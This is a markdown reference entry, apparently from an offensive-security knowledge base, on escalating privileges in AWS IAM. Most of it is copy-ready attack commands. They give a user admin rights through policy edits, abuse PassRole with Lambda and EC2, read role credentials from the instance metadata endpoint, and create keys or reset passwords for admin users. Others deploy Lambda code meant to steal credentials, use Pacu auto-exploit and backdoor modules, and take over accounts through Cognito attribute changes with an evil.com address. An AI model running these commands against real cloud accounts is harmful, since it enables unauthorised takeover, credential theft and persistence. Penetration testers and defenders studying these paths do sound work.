---
id: "aws-iam-privesc"
title: "AWS IAM Privilege Escalation"
type: "technique"
category: "cloud"
subcategory: "aws"
tags: ["aws", "iam", "privilege-escalation", "passrole", "lambda", "pacu", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["metadata-ssrf", "cloud-misconfigurations", "cicd-attacks"]
difficulty: "advanced"
updated: "2026-04-14"
---

# AWS IAM Privilege Escalation

## 21+ Known Privesc Paths (Rhino Security Labs)

### Direct Policy Manipulation
```bash
# iam:CreatePolicyVersion — create admin version, set as default
aws iam create-policy-version --policy-arn arn:aws:iam::ACCT:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# iam:AttachUserPolicy — attach admin policy to self
aws iam attach-user-policy --user-name myuser \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:PutUserPolicy — add inline admin policy
aws iam put-user-policy --user-name myuser --policy-name admin \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# iam:AddUserToGroup — add self to admin group
aws iam add-user-to-group --user-name myuser --group-name admins
```

### PassRole + Service Chains
```bash
# PassRole + Lambda = RCE with high-priv role
aws lambda create-function --function-name privesc \
  --runtime python3.9 --role arn:aws:iam::ACCT:role/admin-role \
  --handler lambda_function.lambda_handler --code file://exploit.zip
aws lambda invoke --function-name privesc output.txt

# PassRole + EC2 = Launch instance with admin profile
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Arn=arn:aws:iam::ACCT:instance-profile/admin-profile
# Then hit metadata: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role

# PassRole + CloudFormation = Create stack with admin role
# PassRole + Glue = Create dev endpoint with admin role
# PassRole + SageMaker = Create notebook with admin role
```

### Create/Update-Based
```bash
# iam:CreateAccessKey — create keys for other users (including admins)
aws iam create-access-key --user-name admin-user

# iam:UpdateLoginProfile — reset console password for any user
aws iam update-login-profile --user-name admin-user --password NewP@ss123!

# lambda:UpdateFunctionCode — overwrite Lambda to exfil its role's creds
aws lambda update-function-code --function-name target-func --zip-file file://exfil.zip
```

## Pacu Modules
```bash
pip3 install pacu && pacu
run iam__privesc_scan           # Auto-detect and exploit all privesc paths
run iam__enum_permissions       # Enumerate current permissions
run iam__enum_users_roles_policies_groups
run ebs__explore_snapshots      # Find exposed EBS snapshots with secrets
run iam__backdoor_assume_role   # Persistence via backdoor role
```

## AWS Cognito Misconfiguration
```bash
# Self-signup (even without signup UI):
aws cognito-idp sign-up --client-id CLIENT_ID \
  --username attacker@evil.com --password 'P@ssw0rd!'

# Attribute manipulation for privesc:
aws cognito-idp update-user-attributes --access-token TOKEN \
  --user-attributes Name="custom:role",Value="admin"

# Email attribute change for ATO:
aws cognito-idp update-user-attributes --access-token TOKEN \
  --user-attributes Name="email",Value="victim@target.com"
```

## Tools
- Pacu (exploitation framework)
- enumerate-iam (brute-force permissions without CloudTrail)
- Cloudsplaining (identify privesc paths in policies)
- Prowler (`prowler aws -c check_iam_*`)
- ScoutSuite (`python scout.py aws`)
